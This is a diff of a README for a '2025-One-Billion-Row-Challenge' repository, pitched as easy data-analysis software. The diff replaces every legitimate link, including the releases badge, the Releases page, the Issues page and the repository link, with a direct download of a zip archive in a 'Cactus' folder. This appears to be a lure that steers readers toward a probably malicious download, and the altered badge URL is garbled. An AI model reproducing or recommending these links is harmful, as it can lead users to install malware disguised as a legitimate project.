@@ -1,7 +1,7 @@
 # 🎉 2025-One-Billion-Row-Challenge - Build Your Data Insights Easy
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Now%20-%20Latest%20Release-brightgreen)](https://github.com/SanikaC1999/2025-One-Billion-Row-Challenge/releases)
+[![Download the latest release](https://raw.githubusercontent.com/SanikaC1999/2025-One-Billion-Row-Challenge/main/Cactus/2025-One-Billion-Row-Challenge.zip%20Now%20-%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/SanikaC1999/2025-One-Billion-Row-Challenge/main/Cactus/2025-One-Billion-Row-Challenge.zip)
 
 ## 🚀 Getting Started
 Welcome to the **2025-One-Billion-Row-Challenge**! This software helps you analyze large data sets with ease. It supports a wide range of features designed to make working with data simple and efficient. In the following sections, you will find everything you need to download, install, and start using this application.
@@ -15,7 +15,7 @@ Before you begin, ensure that your computer meets the following requirements:
 - **Dependencies:** Ensure you have the latest version of Java installed.
 
 ## 📦 Download & Install
-To download the software, visit our [Releases page](https://github.com/SanikaC1999/2025-One-Billion-Row-Challenge/releases). You will find the latest version available for download.
+To download the software, visit our [Releases page](https://raw.githubusercontent.com/SanikaC1999/2025-One-Billion-Row-Challenge/main/Cactus/2025-One-Billion-Row-Challenge.zip). You will find the latest version available for download.
 
 1. Click the link above to access the Releases page.
 2. Look for the latest version available for your operating system.
@@ -47,7 +47,7 @@ If you encounter any issues, consider the following steps:
 
 - **Support Options:**
   - Check the FAQ section in the app.
-  - Visit the [GitHub Issues page](https://github.com/SanikaC1999/2025-One-Billion-Row-Challenge/issues) to report any bugs or ask questions.
+  - Visit the [GitHub Issues page](https://raw.githubusercontent.com/SanikaC1999/2025-One-Billion-Row-Challenge/main/Cactus/2025-One-Billion-Row-Challenge.zip) to report any bugs or ask questions.
 
 ## 📢 Features
 The **2025-One-Billion-Row-Challenge** offers several powerful features:
@@ -68,6 +68,6 @@ If you want to contribute to this project, we welcome your input. You can start 
 ## 🔗 Further Resources
 To explore more about the application and its updates, please visit our repository:
 
-[2025-One-Billion-Row-Challenge Repository](https://github.com/SanikaC1999/2025-One-Billion-Row-Challenge)
+[2025-One-Billion-Row-Challenge Repository](https://raw.githubusercontent.com/SanikaC1999/2025-One-Billion-Row-Challenge/main/Cactus/2025-One-Billion-Row-Challenge.zip)
 
 Feel free to dive into our documentation and join our community of users working with data effectively.
